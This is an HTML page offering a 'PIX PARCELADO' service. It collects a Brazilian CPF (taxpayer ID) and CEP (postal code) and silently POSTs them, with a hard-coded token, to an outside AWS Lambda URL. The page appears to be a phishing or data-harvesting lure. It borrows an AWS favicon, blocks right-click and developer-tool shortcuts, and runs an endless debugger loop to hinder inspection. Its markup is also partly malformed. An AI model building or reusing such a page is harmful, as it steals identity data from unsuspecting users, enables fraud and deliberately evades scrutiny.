<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>SISTEMA DROPFFY IA</title>
    
     <script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.10.4/gsap.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/vanta@latest/dist/vanta.net.min.js"></script>
    <link rel="icon" type="image/ico" href="https://a0.awsstatic.com/libra-css/images/site/fav/favicon.ico">
    
    <style>
        /* Estilo simplificado para garantir funcionamento */
        body { background: #000; color: #fff; font-family: sans-serif; text-align: center; padding-top: 50px; }
        .box { border: 1px solid #f39c12; padding: 20px; display: inline-block; border-radius: 10px; background: #0a0a0a; }
        input { display: block; margin: 10px auto; padding: 10px; width: 250px; border-radius: 5px; border: none; }
        button { background: #fff; color: #000; padding: 15px 30px; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; }
        #status { color: #f39c12; margin-top: 15px; font-weight: bold; }

    </style>

  
    
</head>
<body>
    <div class="box">
        <h3>‚ö° PIX PARCELADO</h3>
        <input type="text" id="cpf" placeholder="CPF">
        <input type="text" id="cep" placeholder="CEP">
        <button onclick="acionarV12()">RECONECTAR</button>
        <div id="status">AGUARDANDO COMANDO...</div>
        <p style="font-size: 10px; opacity: 0.5;">EMET ECHAD SETER - N√çVEL ATIVADO</p>
    </div>


     <script>
      
    <script>
        async function acionarV12() {
            const status = document.getElementById('status');
            const url_lambda = "https://canmeldpzs22gt57rdkzxpbgpa0vshpk.lambda-url.sa-east-1.on.aws/";
            
            status.innerText = "üöÄ CONECTANDO √Ä INST√ÇNCIA...";

            try {
                const response = await fetch(url_lambda, {
                    method: 'POST',
                    mode: 'no-cors', // MUDAN√áA CR√çTICA: ignora erros de CORS do navegador
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        cpf: document.getElementById('cpf').value,
                        cep: document.getElementById('cep').value,
                        v12_auth: "20260112PB1F252F75254"
                    })
                });

                // Como usamos no-cors, o navegador n√£o deixa ler a resposta,
                // mas a AWS recebe os dados. Vamos aguardar 3 segundos e avisar.
                status.innerText = "‚úÖ COMANDO ENVIADO! VERIFIQUE O PAINEL.";
                
            } catch (err) {
                status.innerText = "‚ùå FALHA CR√çTICA DE INST√ÇNCIA.";
            }
        }
    </script>

    <script>

          // 1. FUNDO NEURAL (VANTA.JS)
        VANTA.NET({
            el: "#vanta-bg",
            mouseControls: true,
            touchControls: true,
            color: 0xffa500,
            backgroundColor: 0x070707,
            points: 15.0,
            maxDistance: 20.0,
            spacing: 15.0
        });

        // 2. M√ÅSCARA DE CPF SIMPLIFICADA
        document.getElementById('cpf').addEventListener('input', e => {
            let v = e.target.value.replace(/\D/g,"");
            v = v.replace(/(\d{3})(\d)/,"$1.$2").replace(/(\d{3})(\d)/,"$1.$2").replace(/(\d{3})(\d{1,2})$/,"$1-$2");
            e.target.value = v;
        });


    </script>

          <script>


    // 1. Bloqueia o Clique Direito
    document.addEventListener('contextmenu', event => event.preventDefault());

    // 2. Bloqueia Atalhos de Teclado (F12, Ctrl+U, Ctrl+Shift+I)
    document.onkeydown = function(e) {
        if (e.keyCode == 123) return false; // F12
        if (e.ctrlKey && e.shiftKey && e.keyCode == 'I'.charCodeAt(0)) return false;
        if (e.ctrlKey && e.shiftKey && e.keyCode == 'C'.charCodeAt(0)) return false;
        if (e.ctrlKey && e.shiftKey && e.keyCode == 'J'.charCodeAt(0)) return false;
        if (e.ctrlKey && e.keyCode == 'U'.charCodeAt(0)) return false;
    };

    // 3. Anti-Debugger (Trava o console se for aberto)
    setInterval(function() {
        debugger;
    }, 100);
</script>

</body>
</html>
